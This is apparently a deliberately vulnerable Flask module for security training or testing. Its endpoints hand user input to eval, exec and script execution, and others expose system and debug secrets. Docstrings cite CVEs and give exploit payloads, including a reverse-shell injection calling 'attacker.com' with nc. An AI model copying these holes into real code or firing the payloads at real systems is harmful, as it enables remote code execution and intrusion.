"""Analysis views with RCE vulnerabilities

VULNERABILITIES:
- eval/exec RCE
- Command injection
"""

from flask import Blueprint, request, jsonify
from ..services.analysis_service import AnalysisService
from ..services.pickle_service import PickleService
from ..utils.info import InfoService

analysis_bp = Blueprint('analysis', __name__)


@analysis_bp.route('/eval', methods=['POST'])
def evaluate():
    """VULN: RCE via eval
    CVE Reference: CVE-2023-6019 (Ray OS), CVE-2025-0868 (DocsGPT), CVE-2024-23346 (Pymatgen)
    
    Exploit: POST {"expr": "__import__('os').system('id')"}
    """
    expr = request.json.get('expr', '')
    data = request.json.get('data')
    
    # VULN: eval RCE
    result = AnalysisService.evaluate_expression(expr, data)
    return jsonify(result)


@analysis_bp.route('/execute', methods=['POST'])
def execute():
    """VULN: RCE via exec
    CVE Reference: CVE-2024-42845 (Invesalius3), CVE-2025-1550 (Keras)
    
    Exploit: POST {"code": "import os; os.system('whoami')"}
    """
    code = request.json.get('code', '')
    data = request.json.get('data')
    
    # VULN: exec RCE
    result = AnalysisService.execute_analysis(code, data)
    return jsonify(result)


@analysis_bp.route('/run-script', methods=['POST'])
def run_script():
    """VULN: Command injection via script execution
    CVE Reference: CVE-2024-11392 (HuggingFace RCE)
    
    Exploit: POST {"script": "/tmp/evil.py; nc attacker.com 4444 -e /bin/sh #"}
    """
    script_path = request.json.get('script')
    args = request.json.get('args', [])
    
    # VULN: Command injection
    result = AnalysisService.run_script(script_path, args)
    return jsonify(result)


@analysis_bp.route('/stats', methods=['POST'])
def statistical_analysis():
    """VULN: Formula injection
    CVE Reference: CVE-2024-23346 (Pymatgen)
    
    Exploit: POST {"formula": "exec('import os; os.system(\\'id\\')')"}
    """
    dataset = request.json.get('dataset', [])
    formula = request.json.get('formula')
    
    # VULN: eval in formula
    result = AnalysisService.statistical_analysis(dataset, formula)
    return jsonify(result)


@analysis_bp.route('/info', methods=['GET'])
def system_info():
    """VULN: Info disclosure
    CVE Reference: CVE-2017-14955 (Check_MK), CVE-2024-22513 (JWT)
    """
    # VULN: Exposes system information
    return jsonify(InfoService.get_system_info())


@analysis_bp.route('/debug', methods=['GET'])
def debug_info():
    """VULN: Debug info exposure
    CVE Reference: CVE-2014-0242 (mod_wsgi)
    """
    # VULN: Exposes configuration and secrets
    return jsonify(InfoService.debug_info())
